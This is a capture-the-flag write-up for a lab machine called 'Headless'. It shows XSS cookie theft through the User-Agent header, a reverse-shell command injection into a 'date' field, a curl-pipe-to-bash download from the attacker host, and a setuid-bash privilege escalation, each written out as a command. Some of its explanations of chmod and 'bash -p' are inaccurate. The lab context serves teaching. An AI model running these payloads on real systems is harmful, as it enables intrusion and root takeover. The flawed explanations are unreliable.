# 😳 Headless

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

First i start by scanning our machine:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

the port 5000 seemed to be the initial go to ->

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So after that I'll use feroxbuster to see if there is more to this:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

the **For questions** button led to the support page:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and the dashboard is unauthorized:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's see if we can trigger some errors:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

absolutely no response when submitted, weird

after trying to XSS this website with this:

```
<script>prompt(1)</script>
```

I got this error back:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we have to modify this packate adding our payload at the ending separeting it with “;” and in our User-Agent field.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
python3 -m http.server 8989
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
Cookie: ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
nc -lvnp 8585
```

tried to capture a report generated and paste a shell

```
date=2023-09-15; sh -i >& /dev/udp/10.10.14.166/8585 0>&1
```

but it did not work

so i tried creating a file:&#x20;

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
curl http://10.10.14.166:8000/shell.sh|bash
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

make a python server on port 8000, call it to retrieve your shell, then it will execute on server and return a reverse shell

first:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we cat the file and analise it, we can find that its manipulating a file name “initdb.sh”

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
echo "chmod +u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
/bin/bash -p 
whoami 
-root
```

this writes the string `chmod +u+s /bin/bash` into it. The `chmod +x initdb.sh` command then makes the `initdb.sh` file executable. The `sudo /usr/bin/syscheck` command is likely used to check the system for any inconsistencies or vulnerabilities.

The `+u+s` argument specifies that the user who owns the file (`u`) should be granted the setuid permission (`s`). The `setuid` permission allows any user to execute the file with the privileges of the user who owns the file, rather than the privileges of the user who started the file.

In this case, the `/bin/bash` file is being modified to allow the setuid bit for the user who owns the file. This means that any user can execute `bash` with the privileges of the user who owns the file, which is typically the root user. This technique can be used to escalate privileges in a system.

The crucial part of this sequence is the `/bin/bash -p` command, which starts a new `bash` shell with the `-p` option. This option preserves the environment's real and effective user and group IDs, as well as the saved user and group IDs. This is important because it ensures that the new `bash` shell runs with the original user's privileges, rather than the privileges of the user who started the `bash` shell.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>
